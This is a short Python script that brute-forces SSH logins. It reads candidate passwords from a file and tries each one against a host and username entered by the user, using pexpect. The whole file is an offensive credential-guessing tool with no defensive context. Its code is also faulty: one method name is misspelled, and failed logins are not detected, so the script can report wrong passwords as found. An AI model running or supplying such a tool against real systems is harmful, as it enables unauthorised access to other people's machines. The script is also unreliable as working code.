#!/usr/bin/python3
import pexpect
from termcolor import colored

PROMPT=['# ','>>> ','> ','\$ ']

def connect(host,user,password):
	question="Are you sure you want to continue connecting"
	command="ssh "+user+"@"+host
	child=pexpect.spawn(command)
	ret=child.expect([pexpect.TIMEOUT,question,"[P|p]assword"])
	if ret==0:
		print("[-] Error Connecting")
		return
	elif ret==1:
		child.senfline('yes')
		ret=child.expect([pexpect.TIMEOUT,"[P|p]assword"])
		if ret==0:
			print("[-] Error Connecting")
			return
	child.sendline(password)
	child.expect(PROMPT,timeout=0.5)
	return child


def bruteforcer():
	host=input("IP address: ")
	user=input("Username: ")
	file=open("password.txt","r")
	for password in file.readlines():
		password=password.strip('\n')
		try:
			connect(host,user,password)
			print(colored("[+] Password found: "+password,"green"))
		except:
			print(colored("[-] Password not found: "+password,"red"))

bruteforcer()
